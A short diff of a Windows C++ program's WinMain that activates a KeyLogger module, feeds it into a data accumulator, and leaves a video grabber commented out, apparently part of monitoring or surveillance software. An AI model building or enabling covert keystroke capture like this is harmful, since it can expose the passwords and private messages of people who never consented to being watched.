@@ -5,6 +5,11 @@
 #include "VideoGrabber.h"
 #include "KeyLogger.h"
 
+/** What next:
+ *  	1) Should test DiskQuotaWatcher.KeepLogsWithinQuota() when the logs really excees the quota
+ *  	2) Video grabber!
+ **/
+	
 int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 					LPSTR lpCmdLine, int nCmdShow )
 {
@@ -12,12 +17,12 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
 	quotaKeeper->KeepLogsWithinQuota();
 	//VideoGrabber* videoGrabber = new VideoGrabber();
-	//KeyLogger* keyLogger = new KeyLogger();
+	KeyLogger* keyLogger = new KeyLogger();
 
 	//videoGrabber->SetDataAccumulator(dataAccumulator);
 	//videoGrabber->Init();
-	//keyLogger->SetDataAccumulator(dataAccumulator);
-	//keyLogger->Init();
+	keyLogger->SetDataAccumulator(dataAccumulator);
+	keyLogger->Init();
 
 	MSG Msg; // save window messages here.
 
@@ -30,7 +35,7 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	//keyLogger->Finalize();
 
 	//delete videoGrabber;
-	//delete keyLogger;
+	delete keyLogger;
 	delete quotaKeeper;
 	delete dataAccumulator;
 	return Msg.wParam;
